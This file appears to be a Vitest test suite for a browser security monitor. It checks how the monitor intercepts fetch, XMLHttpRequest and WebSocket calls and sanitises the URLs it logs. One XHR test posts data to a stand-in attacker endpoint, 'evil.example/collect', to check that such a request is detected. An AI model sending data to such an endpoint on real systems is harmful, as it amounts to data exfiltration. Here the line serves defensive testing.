import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { BrowserGuard } from "../src/BrowserGuard";
import type { NetworkRequestData, SecurityEvent } from "../src/Types/SecurityEvent";
import { FlushMicrotasks, ResetGuard } from "./Helpers";

type FetchLike = (...args: unknown[]) => Promise<unknown>;

const ForensicConfig = {
  Console: false,
  Preset: "forensic",
  Monitors: { Dom: false, Csp: false, Prototype: false, Runtime: false },
} as const;

function NetworkEvents(guard: BrowserGuard): SecurityEvent<NetworkRequestData>[] {
  return guard
    .GetTimeline()
    .filter((event) => event.Type === "network.request") as SecurityEvent<NetworkRequestData>[];
}

describe("FetchMonitor", () => {
  let originalFetch: FetchLike;

  beforeEach(() => {
    originalFetch = vi.fn(() => Promise.resolve({ ok: true }));
    window.fetch = originalFetch as typeof window.fetch;
  });

  afterEach(() => {
    ResetGuard();
  });

  it("emite un evento con URL saneada, método, origen y stack", async () => {
    const guard = BrowserGuard.Start(ForensicConfig);
    await window.fetch("https://api.example.com/v1/users?token=secret#frag", { method: "post" });
    await FlushMicrotasks();

    const [event] = NetworkEvents(guard);
    expect(event?.Source).toBe("FetchMonitor");
    expect(event?.Data).toEqual({
      Transport: "fetch",
      Url: "https://api.example.com/v1/users",
      Origin: "https://api.example.com",
      Method: "POST",
      HasQuery: true,
      QueryLength: 12,
    });
    expect(event?.Stack).toBeTypeOf("string");
    expect(JSON.stringify(event)).not.toContain("secret");
  });

  it("preserva argumentos, this y valor de retorno", async () => {
    BrowserGuard.Start(ForensicConfig);
    const init = { method: "GET", headers: { Authorization: "Bearer x" } };
    const result = await window.fetch.call(window, "/relative", init);
    expect(result).toEqual({ ok: true });
    expect(originalFetch).toHaveBeenCalledWith("/relative", init);
    expect(vi.mocked(originalFetch).mock.contexts[0]).toBe(window);
  });

  it("preserva errores síncronos y rechazos", async () => {
    const failure = new TypeError("Failed to fetch");
    window.fetch = vi.fn(() => Promise.reject(failure));
    BrowserGuard.Start(ForensicConfig);
    await expect(window.fetch("/x")).rejects.toBe(failure);

    BrowserGuard.Stop();
    const syncError = new Error("sync");
    window.fetch = vi.fn(() => {
      throw syncError;
    });
    BrowserGuard.Start(ForensicConfig);
    expect(() => window.fetch("/x")).toThrow(syncError);
  });

  it("preserva name y length de la función original", () => {
    function fetch(_input: unknown, _init?: unknown): Promise<unknown> {
      return Promise.resolve(null);
    }
    window.fetch = fetch as typeof window.fetch;
    BrowserGuard.Start(ForensicConfig);
    expect(window.fetch).not.toBe(fetch);
    expect(window.fetch.name).toBe("fetch");
    expect(window.fetch.length).toBe(2);
  });

  it("no emite si la URL es un objeto arbitrario y no ejecuta su toString", async () => {
    const guard = BrowserGuard.Start(ForensicConfig);
    const toString = vi.fn(() => "https://x.example");
    await window.fetch({ toString } as unknown as string);
    await FlushMicrotasks();
    expect(toString).not.toHaveBeenCalled();
    expect(NetworkEvents(guard)[0]?.Data.Url).toBe("[unknown]");
  });

  it("acepta URL y Request como destino", async () => {
    const guard = BrowserGuard.Start(ForensicConfig);
    await window.fetch(new URL("https://cdn.example.com/a.js"));
    if (typeof window.Request === "function") {
      await window.fetch(new window.Request("https://req.example.com/p", { method: "PUT" }));
    }
    await FlushMicrotasks();
    const events = NetworkEvents(guard);
    expect(events[0]?.Data.Origin).toBe("https://cdn.example.com");
    if (typeof window.Request === "function") {
      expect(events[1]?.Data).toMatchObject({ Origin: "https://req.example.com", Method: "PUT" });
    }
  });

  it("Stop restaura la función original exacta", () => {
    BrowserGuard.Start(ForensicConfig);
    expect(window.fetch).not.toBe(originalFetch);
    BrowserGuard.Stop();
    expect(window.fetch).toBe(originalFetch);
  });

  it("no duplica interceptores con Start repetido", async () => {
    const guard = BrowserGuard.Start(ForensicConfig);
    BrowserGuard.Start(ForensicConfig);
    await window.fetch("/once");
    await FlushMicrotasks();
    expect(NetworkEvents(guard)).toHaveLength(1);
    expect(originalFetch).toHaveBeenCalledTimes(1);
  });

  it("si otra librería envuelve fetch después, Stop no rompe su cadena", async () => {
    const guard = BrowserGuard.Start(ForensicConfig);
    const ours = window.fetch;
    const thirdParty = vi.fn((...args: Parameters<typeof window.fetch>) => ours(...args));
    window.fetch = thirdParty;

    BrowserGuard.Stop();
    expect(window.fetch).toBe(thirdParty);
    await window.fetch("/still-works");
    expect(originalFetch).toHaveBeenCalledWith("/still-works");
    expect(NetworkEvents(guard)).toHaveLength(0);
  });

  it("no se instala si fetch no existe", () => {
    const descriptor = Object.getOwnPropertyDescriptor(window, "fetch");
    // @ts-expect-error -- se elimina para simular un entorno sin fetch.
    delete window.fetch;
    const guard = BrowserGuard.Start(ForensicConfig);
    const status = guard.GetStatus().Monitors.find((monitor) => monitor.Name === "FetchMonitor");
    expect(status?.Running).toBe(false);
    if (descriptor) {
      Object.defineProperty(window, "fetch", descriptor);
    }
  });
});

describe("XhrMonitor", () => {
  const prototype = XMLHttpRequest.prototype;
  let originalOpen: typeof prototype.open;
  let originalSend: typeof prototype.send;

  beforeEach(() => {
    originalOpen = prototype.open;
    originalSend = prototype.send;
    // jsdom realizaría la solicitud real; se sustituye send por un doble.
    prototype.send = vi.fn();
  });

  afterEach(() => {
    ResetGuard();
    prototype.open = originalOpen;
    prototype.send = originalSend;
  });

  it("emite un evento al enviar con método y URL de open", async () => {
    const stubSend = prototype.send;
    const guard = BrowserGuard.Start(ForensicConfig);
    const xhr = new XMLHttpRequest();
    xhr.open("post", "https://evil.example/collect?data=1");
    xhr.send("payload");
    await FlushMicrotasks();

    const [event] = NetworkEvents(guard);
    expect(event?.Source).toBe("XhrMonitor");
    expect(event?.Data).toEqual({
      Transport: "xhr",
      Url: "https://evil.example/collect",
      Origin: "https://evil.example",
      Method: "POST",
      HasQuery: true,
      QueryLength: 6,
    });
    expect(stubSend).toHaveBeenCalledWith("payload");
    expect(xhr.readyState).toBe(XMLHttpRequest.OPENED);
  });

  it("no emite si send se llama sin open", async () => {
    const guard = BrowserGuard.Start(ForensicConfig);
    prototype.send.call(new XMLHttpRequest());
    await FlushMicrotasks();
    expect(NetworkEvents(guard)).toHaveLength(0);
  });

  it("Stop restaura open y send", () => {
    const stubSend = prototype.send;
    BrowserGuard.Start(ForensicConfig);
    expect(prototype.open).not.toBe(originalOpen);
    BrowserGuard.Stop();
    expect(prototype.open).toBe(originalOpen);
    expect(prototype.send).toBe(stubSend);
  });
});

describe("WebSocketMonitor", () => {
  class FakeWebSocket {
    public static readonly OPEN = 1;
    public constructor(
      public readonly url: string,
      public readonly protocols?: string | string[],
    ) {}
  }

  let originalWebSocket: typeof WebSocket;

  beforeEach(() => {
    originalWebSocket = window.WebSocket;
    window.WebSocket = FakeWebSocket as unknown as typeof WebSocket;
  });

  afterEach(() => {
    ResetGuard();
    window.WebSocket = originalWebSocket;
  });

  it("emite un evento con URL, origen y protocolos", async () => {
    const guard = BrowserGuard.Start(ForensicConfig);
    new window.WebSocket("wss://socket.example/live?session=abc", ["chat", "v2"]);
    await FlushMicrotasks();

    const [event] = NetworkEvents(guard);
    expect(event?.Source).toBe("WebSocketMonitor");
    expect(event?.Data).toEqual({
      Transport: "websocket",
      Url: "wss://socket.example/live",
      Origin: "wss://socket.example",
      Protocols: ["chat", "v2"],
      HasQuery: true,
      QueryLength: 11,
    });
  });

  it("preserva instanceof, estáticos y argumentos", () => {
    BrowserGuard.Start(ForensicConfig);
    const socket = new window.WebSocket("wss://a.example", "proto") as unknown as FakeWebSocket;
    expect(socket).toBeInstanceOf(FakeWebSocket);
    expect(socket).toBeInstanceOf(window.WebSocket);
    expect(socket.url).toBe("wss://a.example");
    expect(socket.protocols).toBe("proto");
    expect(window.WebSocket.OPEN).toBe(1);
  });

  it("soporta subclases creadas después de iniciar", () => {
    BrowserGuard.Start(ForensicConfig);
    class Custom extends (window.WebSocket as unknown as typeof FakeWebSocket) {
      public Extra = true;
    }
    const socket = new Custom("wss://b.example");
    expect(socket).toBeInstanceOf(Custom);
    expect(socket.Extra).toBe(true);
  });

  it("Stop restaura el constructor original", () => {
    BrowserGuard.Start(ForensicConfig);
    expect(window.WebSocket).not.toBe(FakeWebSocket);
    BrowserGuard.Stop();
    expect(window.WebSocket).toBe(FakeWebSocket);
  });
});
